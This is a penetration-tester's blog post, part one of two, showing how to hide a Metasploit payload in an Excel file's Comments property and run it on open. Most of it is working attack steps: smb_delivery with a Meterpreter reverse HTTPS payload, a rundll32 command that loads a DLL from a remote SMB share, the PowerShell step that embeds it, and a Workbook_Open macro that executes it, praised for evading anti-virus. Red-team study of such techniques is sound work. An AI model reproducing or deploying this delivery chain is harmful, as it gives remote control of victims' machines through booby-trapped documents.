---
title: "Executing Metasploit & Empire Payloads from MS Office Document Properties (part 1 of 2)"
date: 2017-12-06
draft: false
toc: false
images:
  - "/wp-content/uploads/2017/12/Metasploit-1.png"
categories:
  - Security
tags:
  - Empire
  - metasploit
  - Penetration Testing
  - Red Teaming
aliases:
  - "/posts/2017/12/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/"
---

As a penetration tester I’m always excited to see new and creative methods on creating weaponized MS Office documents. This blog post builds on the following findings published by Black Hills InfoSec: [https://www.blackhillsinfosec.com/hide-payload-ms-office-document-properties/](https://www.blackhillsinfosec.com/hide-payload-ms-office-document-properties/)



There are numerous ways on how MS Office documents can be abused and weaponised to deliver a variety of cyber-related attacks. This blog post will demonstrate how quickly and easy it is to hide a Metasploit and Empire payload within a MS Office document and execute it from an embedded Macro.



**Metasploit:** In the first example I’m going to use a payload generated with Metasploits ‘SMB Delivery’ functionality to Weaponise a MS Excel document. The ‘SMB Delivery’ is a personal favourite of mine given its simplicity and subtle anti-virus evasion.



Begin by loading the relevant module into Metasploit:


```
use exploit/windows/smb/smb_delivery
```







* *



* [![](/wp-content/uploads/2017/12/ks-msf1.jpg)](/wp-content/uploads/2017/12/ks-msf1.jpg)*







Set the payload to anything you desire, in this example I’ll be using the Windows Meterpreter Reverse HTTPS payload:


```
set PAYLOAD windows/meterpreter/reverse_https
```







* *



[![](/wp-content/uploads/2017/12/ks-msf2.jpg)](/wp-content/uploads/2017/12/ks-msf2.jpg)







Finally, issue the ‘*exploit*’ command to begin staging the attack:



[![](/wp-content/uploads/2017/12/ks-msf3.jpg)](/wp-content/uploads/2017/12/ks-msf3.jpg)







Now, in order to utilise this, we will need execute the following command on the victim host:


```
rundll32.exe \\192.168.0.11\PPuUdw\test.dll,0
```







* *



**Note: the folder path is randomly generated as we didn’t explicitly define it within the Metasploit options** In order to achieve this, we’re going to embed this command into a MS Excel document within the ‘comments’ property and execute it from an embedded Macro. This can easily be done by using the Powershell script: ‘Commentator’ ([https://github.com/clr2of8/Commentator](https://github.com/clr2of8/Commentator))







Begin by starting PowerShell:


```
powershell.exe -exec bypass
```







* *



Import the module into your PowerShell environment:


```
Import-Module .\Commentator.ps1
```







* *



And execute the script to embed our payload into the ‘comments’ property of the MS Excel document:


```
Invoke-Commentator -OfficeFile .\msf_smb_delivery.xlsx -Comment "rundll32.exe \\192.168.0.11\PPuUdw\test.dll,0"
```







* *



* *



After successful execution, a copy of your existing MS Office file will be created with the payload embedded:



*The new file with added comment has been written to .\msf_smb_delivery-wlc.xlsx.*



*DONE!*



This can be verified by inspecting the file’s metadata / properties:



[![](/wp-content/uploads/2017/12/ks-msf4.jpg)](/wp-content/uploads/2017/12/ks-msf4.jpg)







Lastly, in order to execute the payload embedded within the ‘comments’ property, the following embedded Macro can be used:



* *


```
Sub Workbook_Open()

Dim p As DocumentProperty



 For Each p In ActiveWorkbook.BuiltinDocumentProperties

    If p.Name = "Comments" Then

        Shell (p.Value)

    End If

 Next

End Sub
```















**Note: In order to utilise auto-execution via the ‘*Workbook_Open()*’ function, the weaponised MS Excel document needed to be downgraded to Office 98 – 2003 compatibility (.xls)** [![](/wp-content/uploads/2017/12/ks-msf5.jpg)](/wp-content/uploads/2017/12/ks-msf5.jpg)



After the victim has clicked ‘enable editing’ and ‘enable content’, a Meterpreter session should appear:



* [![](/wp-content/uploads/2017/12/ks-msf6.jpg)](/wp-content/uploads/2017/12/ks-msf6.jpg)*


### About The Author


 -  [](/)

       [**](https://www.facebook.com/sharer.php?u=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/) [**](http://twitter.com/share?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&text=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29) [**](mailto:?subject=Executing%20Metasploit%20%26amp;%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20(part%201%20of%202)&body=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/) [**](https://www.linkedin.com/sharing/share-offsite/?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29) [**](javascript:pinIt();) [**](https://t.me/share/url?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29) [**](https://api.whatsapp.com/send?text=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29) [**](https://www.reddit.com/submit?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29) [**](javascript:window.print())    
## Post navigation

 [Reporting SSL/TLS Issues the Easy Way with YANP](/posts/reporting-ssltls-issues-the-easy-way-with-yanp/)[Executing Metasploit & Empire Payloads from MS Office Document Properties (part 2 of 2)](/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/)
